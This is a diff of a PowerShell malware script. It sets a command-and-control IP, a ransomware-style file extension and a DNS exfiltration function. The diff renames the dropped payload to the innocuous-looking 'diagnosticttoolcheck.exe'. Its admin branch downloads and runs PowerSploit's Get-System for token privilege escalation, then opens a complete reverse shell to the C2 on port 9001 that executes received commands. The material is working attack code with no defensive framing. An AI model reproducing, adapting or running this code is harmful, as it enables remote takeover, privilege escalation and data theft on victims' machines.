@@ -1,6 +1,8 @@
-﻿ #global variables
+﻿#global variables
 $c2="10.171.213.83"
 $encExtension = ".pwndl33t"
+$version="2.0.0"
+$ProgressPreference = 'SilentlyContinue'
 
 function Invoke-DNSExfiltrator
 {
@@ -281,15 +283,16 @@ function main
     $testing = $false
     if ([System.IO.Path]::GetFileName($stager) -ieq "powershell.exe") {$testing = $true}
     $Hpath= "$($home)\AppData\Local\Temp\"
-    if (-not $testing){$payload= "$Hpath\gotyabeach.exe"}
+    $payload= "$Hpath\diagnostictoolcheck.exe"
+    
     #check if current session is admin
     $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
     $admin=$currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
     if ($admin) {
-    $MyInvocation.MyCommand.Path | out-file $Hpath\Succesful.txt
-    . ([ScriptBlock]::Create((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1")))
-    Get-System -Technique Token
-    $client = New-Object System.Net.Sockets.TCPClient($c2,9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();
+        $MyInvocation.MyCommand.Path | out-file $Hpath\Succesful.txt
+        . ([ScriptBlock]::Create((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1")))
+        Get-System -Technique Token
+        $client = New-Object System.Net.Sockets.TCPClient($c2,9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS <#> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();
     }
     elseif (-not $testing) {
         cp $stager $payload
